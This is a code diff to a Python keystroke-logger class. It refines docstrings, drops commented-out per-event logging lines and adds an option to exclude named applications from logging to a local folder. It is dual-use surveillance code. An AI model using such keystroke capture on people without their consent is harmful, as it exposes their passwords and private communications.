@@ -7,7 +7,7 @@ import traceback
 from logwriter import LogWriter
 
 class KeyLogger:
-    ''' Captures all keystrokes, and logs them to a text file
+    ''' Captures all keystrokes, calls LogWriter class to log them to disk
     '''
     def __init__(self): 
         
@@ -28,23 +28,8 @@ class KeyLogger:
             
 
     def OnKeyboardEvent(self, event):
-        '''This function actually writes the stuff to the log, subject to parsing.
-        '''
-        '''
-        self.log.write('MessageName: ' + str(event.MessageName))
-        self.log.write('Message: ' + str(event.Message))
-        self.log.write('Time: ' + str(event.Time))
-        self.log.write('Window: ' + str(event.Window))
-        self.log.write('WindowName: ' + str(event.WindowName))
-        self.log.write('Ascii: ' + str(event.Ascii) + ' ' + chr(event.Ascii))
-        self.log.write('Key: ' + str(event.Key))
-        self.log.write('KeyID: ' + str(event.KeyID))
-        self.log.write('ScanCode: ' + str(event.ScanCode))
-        self.log.write('Extended: ' + str(event.Extended))
-        self.log.write('Injected: ' + str(event.Injected))
-        self.log.write('Alt: ' + str(event.Alt))
-        self.log.write('Transition: ' + str(event.Transition))
-        self.log.write('---\n')
+        '''This function is the stuff that's supposed to happen when a key is pressed.
+        Calls LogWriter.WriteToLogFile with the keystroke properties.
         '''
         
         self.lw.WriteToLogFile(event, self.options)
@@ -55,7 +40,9 @@ class KeyLogger:
         return True
     
     def ParseOptions(self):
-        #usage = "usage: %prog [options] arg"
+        '''Read command line options
+        '''
+                
         parser = OptionParser(version="%prog version 0.4.2")
         parser.add_option("-f", "--file", action="store", dest="dirname", help="write log data to DIRNAME [default: %default]")
         parser.add_option("-k", "--keyboard", action="store_true", dest="hookKeyboard", help="log keyboard input [default: %default]")
@@ -67,6 +54,8 @@ class KeyLogger:
         parser.add_option("-l", "--flushkey", action="store", dest="flushKey", help="specify the key to press to flush write buffer to file [default: %default]")
         parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
         
+        parser.add_option("-n", "--nolog", action="append", dest="noLog", help="specify an application by full path name whose input will not be logged. repeat option for multiple applications. [default: %default]")
+        
         parser.set_defaults(dirname=r"C:\Temp\logdir",
                             hookKeyboard=True,
                             addLineFeed=False,
@@ -74,7 +63,8 @@ class KeyLogger:
                             parseEscape=False,
                             exitKey='F12',
                             flushKey='F11',
-                            debug=False)
+                            debug=False,
+                            noLog=None)
 
         (self.options, args) = parser.parse_args()
             
